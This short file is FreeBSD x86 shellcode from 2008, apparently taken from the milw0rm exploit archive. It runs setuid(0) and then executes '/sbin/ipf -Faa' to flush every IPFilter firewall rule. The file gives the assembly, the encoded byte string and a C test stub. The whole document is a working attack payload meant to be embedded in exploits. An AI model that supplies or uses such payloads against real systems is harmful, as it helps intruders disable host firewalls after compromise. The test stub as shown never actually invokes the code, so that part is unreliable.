; sm4x - 2008
; setuid(0); execve("//sbin/ipf", {"//sbin/ipf", "-Faa", 0}, 0);
; 57 bytes
; FreeBSD 7.0-RELEASE

global _start

_start:
main:

; --------------------- setuid (0)
xor     eax, eax
xor     ecx, ecx
push    eax
push        eax
mov     al, 0x17
int     0x80
; --------------------- -Faa
xor     eax, eax
push    eax
push    0x6161462d      ; -Faa
mov     ecx, esp

; --------------------- setup //sbin/ipf
push    eax
push    word 0x6670
push    0x692f6e69
push    0x62732f2f
mov     ebx, esp

; ---------------------- array setup
push    eax
push    ecx
push    ebx
mov     ecx, esp

; ---------------------- call to execve
push    eax
push    ecx
push    ebx

mov     al, 0x3b
push    eax
int     0x80

xor     eax, eax
push    eax
push    eax
int     0x80

/*

char code[] = "\x31\xc0\x31\xc9\x50\x50\xb0\x17\xcd    \x80"
                              "\x31\xc0\x50\x68\x2d\x46\x61\x61\x89\xe1"
                              "\x50\x66\x68\x70\x66\x68\x69\x6e\x2f\x69"
                              "\x68\x2f\x2f\x73\x62\x89\xe3\x50\x51\x53"
                              "\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80"
                              "\x31\xc0\x50\x50\xcd\x80";

int main(int argc, char **argv) {
        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
}

*/

// milw0rm.com [2008-08-21]